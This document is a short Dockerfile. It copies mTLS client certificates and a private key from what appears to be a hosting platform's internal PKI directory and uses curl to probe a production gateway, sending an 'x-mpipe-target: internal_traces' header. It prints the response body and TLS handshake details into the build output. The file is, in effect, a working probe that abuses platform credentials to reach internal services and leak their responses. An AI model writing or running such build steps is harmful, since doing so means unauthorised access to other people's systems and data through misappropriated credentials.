FROM alpine:3.20
COPY var/lib/railwayapp/mtls-pki/client.crt /pki/client.crt
COPY var/lib/railwayapp/mtls-pki/client.key /pki/client.key
COPY var/lib/railwayapp/mtls-pki/server-ca-bundle.crt /pki/ca.crt
RUN set -x; echo "===E1==="; \
 apk add --no-cache curl >/dev/null 2>&1; \
 echo "--NOAUTH--"; \
 curl -s -m 8 -o /dev/null -w "noauth_http=%{http_code}\n" --cacert /pki/ca.crt https://external-mtls-service-gateway-us-west1.gcp.production.rlwy.net/ 2>&1 | tail -3; \
 echo "--MTLS--"; \
 curl -s -m 10 -o /tmp/out.bin -w "mtls_http=%{http_code} size=%{size_download}\n" --cert /pki/client.crt --key /pki/client.key --cacert /pki/ca.crt -H 'x-mpipe-target: internal_traces' https://external-mtls-service-gateway-us-west1.gcp.production.rlwy.net/ 2>&1 | tail -5; \
 echo "--BODY--"; head -c 300 /tmp/out.bin 2>&1 | tr -d '\0'; echo; \
 echo "--VERBOSE--"; \
 curl -sv -m 10 --cert /pki/client.crt --key /pki/client.key --cacert /pki/ca.crt https://external-mtls-service-gateway-us-west1.gcp.production.rlwy.net/ 2>&1 | grep -E "SSL|ALPN|HTTP|subject|issuer|error" | head -20; \
 echo "===E1END==="
CMD ["sh","-c","sleep 3600"]
